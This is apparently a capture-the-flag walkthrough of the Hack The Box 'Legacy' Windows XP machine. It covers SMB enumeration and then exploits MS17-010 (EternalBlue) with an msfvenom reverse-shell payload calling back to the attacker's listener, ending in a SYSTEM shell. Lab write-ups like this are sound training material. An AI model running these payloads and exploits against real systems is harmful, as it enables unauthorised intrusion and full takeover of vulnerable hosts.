# Hackthebox Legacy

Reset the machinei just in case.

## Enumeration

First do the standard portscanning of every tcp port on the system.

```
$ nmap -Pn -sV -oX nmap_full_legacy.xml -p- 10.10.10.4
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-07 12:17 EDT
Nmap scan report for 10.10.10.4
Host is up (0.035s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Microsoft Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.45 seconds
```

The services we are looking at are Samba and RDP (Remote Desktop Protocol).

Enumerate the service versions does not bring much details
```
$ nmap -Pn -A -T4 -p 139,445,3389 10.10.10.4 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-07 12:31 EDT
Nmap scan report for 10.10.10.4
Host is up (0.035s latency).

PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h27m44s, deviation: 2h07m16s, median: 4d22h57m44s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:63:d1 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-10-12T21:29:32+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.47 seconds

```

Samba does not give us much more using commands
```
$ sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 10.10.10.4
$ nmap -Pn --script smb-enum-shares.nse -p445 10.10.10.4
$ smbclient -N -L ////10.10.10.4
$ smbclient -U "" \\\\10.10.10.4\\

```
But we get more information with enum4linux and nbmlookup
```
$ nmblookup -A 10.10.10.4      
Looking up status of 10.10.10.4
	LEGACY          <00> -         B <ACTIVE> 
	HTB             <00> - <GROUP> B <ACTIVE> 
	LEGACY          <20> -         B <ACTIVE> 
	HTB             <1e> - <GROUP> B <ACTIVE> 
	HTB             <1d> -         B <ACTIVE> 
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE> 

$ enum4linux -U 10.10.10.4                                                                                                                1 ⨯
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Oct  7 13:02:55 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.4
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.4    |
 ================================================== 
[+] Got domain/workgroup name: HTB

 =================================== 
|    Session Check on 10.10.10.4    |
 =================================== 
[+] Server 10.10.10.4 allows sessions using username '', password ''

 ========================================= 
|    Getting domain SID for 10.10.10.4    |
 ========================================= 
Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED
[+] Can't determine if host is part of domain or part of a workgroup

 =========================== 
|    Users on 10.10.10.4    |
 =========================== 
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED
```

## Vulnerability analysis

As we have an Windows XP machine there is a good chance we find some Samba vulnerabilities.
```
$ nmap -Pn --script smb-vuln* -p 445 10.10.10.4
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-07 12:46 EDT
Nmap scan report for 10.10.10.4
Host is up (0.040s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

```
Indeed, MS08-067 and MS17-010 (Eternal Blue) are found.

## System hacking

### Samba

#### MS08-067

TODO

#### MS17-010 (Eternal Blue)

Credit to https://github.com/helviojunior/MS17-010

Install Python 2.7.18 using pyenv
pyenv installer: https://github.com/pyenv/pyenv-installer
Kali instructions to use EOL python versions: https://www.kali.org/docs/general-use/using-eol-python-versions/
pyenv tutorial for the basic commands: https://amaral.northwestern.edu/resources/guides/pyenv-tutorial

Once the python virtual environment is created and the virtual python binary is found from the PATH

Create the payload

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.18 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev_10.10.14.18_443.exe
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: rev_10.10.14.18_443.exe
```
Start the listener
```
$ nc -nvlp 443            
listening on [any] 443 ...
```

Execute the script
```
$ python send_and_execute.py 10.10.10.4 rev_10.10.14.18_443.exe                                                                                       2 ⨯
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x81b036c0
SESSION: 0xe10506a8
FLINK: 0x5bd48
InData: 0x5ae28
MID: 0xa
TRANS1: 0x58b50
TRANS2: 0x5ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe21b06a8
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe21b0748
overwriting token UserAndGroups
Sending file 1RIA57.exe...
Opening SVCManager on 10.10.10.4.....
Creating service xqJm.....
Starting service xqJm.....

```
And we have a shell
```
$ nc -nvlp 443            
listening on [any] 443 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.4] 1045
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.

C:\WINDOWS\system32>systeminfo
systeminfo

Host Name:                 LEGACY
OS Name:                   Microsoft Windows XP Professional
OS Version:                5.1.2600 Service Pack 3 Build 2600
...
```
Since whoami did not work, we shall get it from our Kali box. Set up a share that we can access from the target machine.
```
$ locate whoami.exe                            
/usr/share/windows-resources/binaries/whoami.exe
$ smbserver.py sharedir /usr/share/windows-binaries 
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```
And now access the file from the target machine
```
C:\WINDOWS\system32>\\10.10.14.18\sharedir\whoami.exe
\\10.10.14.18\a\whoami.exe
NT AUTHORITY\SYSTEM

C:\WINDOWS\system32>
```
And the flag is in the usual place
```
C:\Documents and Settings\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\Administrator\Desktop

16/03/2017  09:18 ��    <DIR>          .
16/03/2017  09:18 ��    <DIR>          ..
16/03/2017  09:18 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.400.626.688 bytes free
```




